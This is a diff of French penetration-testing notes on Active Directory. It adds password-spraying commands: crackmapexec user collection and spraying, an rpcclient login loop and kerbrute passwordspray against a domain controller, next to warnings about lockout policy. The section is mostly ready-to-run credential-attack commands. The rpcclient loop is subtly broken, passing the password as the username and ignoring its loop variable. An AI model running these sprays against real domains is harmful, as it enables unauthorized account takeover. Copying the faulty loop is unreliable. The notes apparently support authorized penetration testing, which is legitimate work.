@@ -84,15 +84,26 @@ Lorsqu'on dispose d'une liste de comptes utilisateurs, on peut ensuite essayer d
 **Attention** :
 - toujours vérifier la politique de mot de passe en place (voir plus haut) avant de tenter un password spraying.
 - ne pas tenter le nombre maximum de tentatives autorisées !
-- `cme [...] --users`  affiche le nombre de mauvaise saisie des compteurs d'authentification (a exécuter sur le PDC emulator pour avoir une info)
+- `cme [...] --users`  affiche le nombre de mauvaise saisie des compteurs d'authentification (a exécuter sur le PDC emulator pour avoir l'information centralisée de tous les DCs)
 
-```
+```shell
 # Collect users
 cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --users | tr -s ' ' | tail -n +4 | cut -d ' ' -f 5 | cut -d '\' -f 2 | tee users.txt
-
-# Password spraying with new grabbed users
-cme smb $TARGET_IP -u users.txt -p $AD_PASSWORD --continue-on-success
 ```
+
+Attaque à partir d'une liste d'utilisateurs avec un mot de passe `$AD_PASSWORD`
+
+```shell
+# crackmapexec
+cme smb $TARGET_IP -u users.txt -p $AD_PASSWORD --continue-on-success | grep '+'
+
+# rpcclient
+for u in $(cat users.txt);do rpcclient -U "$AD_PASSWORD" -c "getusername;quit" $TARGET_IP | grep Authority; done
+
+# kerbrute
+kerbrute passwordspray -d DOMAIN.LOCAL --dc $TARGET_IP users.txt  "$AD_PASSWORD"
+```
+
 
 #### Partages
 ##### Enumération
